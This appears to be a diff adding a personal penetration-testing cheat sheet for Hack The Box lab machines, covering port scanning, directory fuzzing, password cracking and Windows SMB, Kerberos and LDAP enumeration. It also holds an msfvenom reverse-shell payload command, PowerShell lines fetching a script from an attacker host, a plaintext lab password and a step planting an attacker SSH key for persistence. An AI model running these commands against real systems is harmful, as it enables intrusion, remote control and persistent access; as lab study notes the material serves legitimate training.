@@ -1,0 +1,57 @@
+#NMAP
+nmap -sC -sV -p- 10.10.10.146
+
+#name htb 
+sudo nano /etc/hosts
+
+#wfuzz
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://wall.htb/FUZZ
+wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://wall.htb/FUZZ
+wfuzz -c -w /home/prosen/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.playerii.htb' --hc 403,404 'http://playerii.htb'
+
+#Gobuster
+gobuster dir -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://bighead.htb
+
+#John
+john --wordlist=~/opt/dict/rockyou.txt newdb.kdb.hash
+
+# WINDOWS DNS port 53
+dnsrecon -d 10.10.10.161 -r 10.0.0.0/8
+
+# WINDWOS KERBEROS port 88
+nmap --script krb5-enum-users --script-args krb5-enum-users.realm='HTB',userdb=users.txt 10.10.10.161
+
+# WINDOWS SMB port 445
+nmap --script safe -p 445 forest.htb
+smbclient -L //10.10.10.161
+enum4linux 10.10.10.161
+smbmap -H 10.10.10.161
+
+# WINDOWS LDAP port 389
+ldapsearch -h 10.10.10.161 -p 389 -x -b dc=htb,dc=local
+nmap -p 389 --script ldap-search forest.htb
+
+# WINDOWS Misc
+ldapsearch -LLL -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" '(objectclass=User)' | grep sAMAccountName
+
+
+# msfvenom
+sfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+# Powershell
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.example.com/package.zip', 'package.zip')"
+powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile package.zip"
+Invoke-WebRequest http://www.google.com/ -OutFile c:\google.html
+Invoke-WebRequest -URI http://10.10.14.29:8888/poc.ps1 -UseBasicParsing
+
+# bloodhound
+pip install bloodhound
+bloodhound-python -dc 10.10.10.169 -gc 10.10.10.169 -c All -u ryan -p Serv3r4Admin4cc123! --dns-tcp -d megabank.local
+sudo neo4j console
+zip data.zip *.json
+update_data data.zip
+
+# SSH keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRcHFluXcb9Ii8KWtDVGUDQvLOOSzUY8tI4KyiZXw6xgeUQR0xnfJ2puzuPmdk6JvV9VkXAfloCajaOQlW8ouojYuH2fT1wQ41SCueBad8U9HLXzvt/K19izl0X8wz5yBO5myBkOxwsIyZUbxscAnLEhGn8PJ9UpTkOc3pT/8sQSirMD97HKE3H72kBlg+oPhT9HNK15YrlyNzPL0++Dkpzujfwu9Uwu1fFnfKrlzJKJX2MgZKTtf945k52VhQTyn97k4xPR8QQQMB822xvCPFEKdMQZ0ilE1vwBUAcXpBog9a3d8BwoHJwp0nzorKni1fSrwo7y6+LK6iso0yV5eYzKjvwSlZVjKtGKNUwSJqyL2EPYn3Y93LpBScLz/7qdVBUQr8hSQUp1izZDZmnLHuFWf9t3DsFI085sXxzQdWwTpeu56XZDnyWZVZZ5VvqOHerp+qnGeuxlhO8X5Fnm9UPFd1mv4bt7KHqte8SiOK8ivHur1mn9aeb8ctkzE1Aek= prosen@kali" > /home/ib01c03/.ssh/authorized_keys
+
+chmod 600 /home/ib01c03/.ssh/authorized_keys
